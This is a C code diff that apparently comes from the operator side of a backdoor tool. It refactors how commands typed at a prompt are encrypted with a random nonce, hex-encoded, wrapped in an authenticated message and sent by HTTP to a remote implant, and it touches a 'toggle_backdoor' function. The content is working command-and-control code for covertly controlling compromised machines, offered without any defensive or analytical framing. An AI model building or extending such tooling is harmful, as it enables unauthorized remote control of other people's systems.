@@ -20,7 +20,7 @@ static void toggle_backdoor(int message_id, int command_type)
   unsigned char message[BUF_SIZE], buf[BUF_SIZE];
 
   generate_rand_string(buf, 24);
-  craft_message(message, AUTH_HEADER, message_id, command_type, buf, 24);
+  craft_message(message, AUTH_HEADER, message_id, command_type, 24, buf, buf);
   send_request(message);
 }
 
@@ -36,8 +36,11 @@ int main()
 {
   ssize_t n;
   size_t len = 0;
-  int ciphertext_len, command_type;
-  unsigned char ciphertext_hex[DATA_BUF_SIZE], ciphertext[DATA_BUF_SIZE], message[DATA_BUF_SIZE];
+  int ciphertext_len, command_type, i;
+  unsigned char nonce[crypto_secretbox_NONCEBYTES];
+  unsigned char ciphertext_hex[DATA_BUF_SIZE], ciphertext[DATA_BUF_SIZE], message[DATA_BUF_SIZE], nonce_hex[BUF_SIZE];
+  char buf[BUF_SIZE];
+
   curl_global_init(CURL_GLOBAL_DEFAULT);
 
   signal(SIGINT, cleanup);
@@ -48,15 +51,24 @@ int main()
   {
     // remove newline
     line[n - 1] = 0;
-    if ((ciphertext_len = encrypt((unsigned char *)line, len, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH, ciphertext)) < 0)
+    i = 0;
+    while (line[i] != ' ' && line[i] != '\0')
+    {
+      i++; 
+    }
+    snprintf(buf, sizeof(buf), "%.*s", i, line);
+    command_type = get_command_type(buf);
+    randombytes_buf(nonce, sizeof(nonce));
+
+    if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)line, len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
     {
       log_error("encrypt");
       continue;
     }
 
     to_hex(ciphertext, ciphertext_len, ciphertext_hex);
-    command_type = get_command_type(line);
-    if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_hex, ciphertext_len) < 0)
+    to_hex(nonce, sizeof(nonce), nonce_hex);
+    if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
     {
       log_error("craft_message");
       continue;
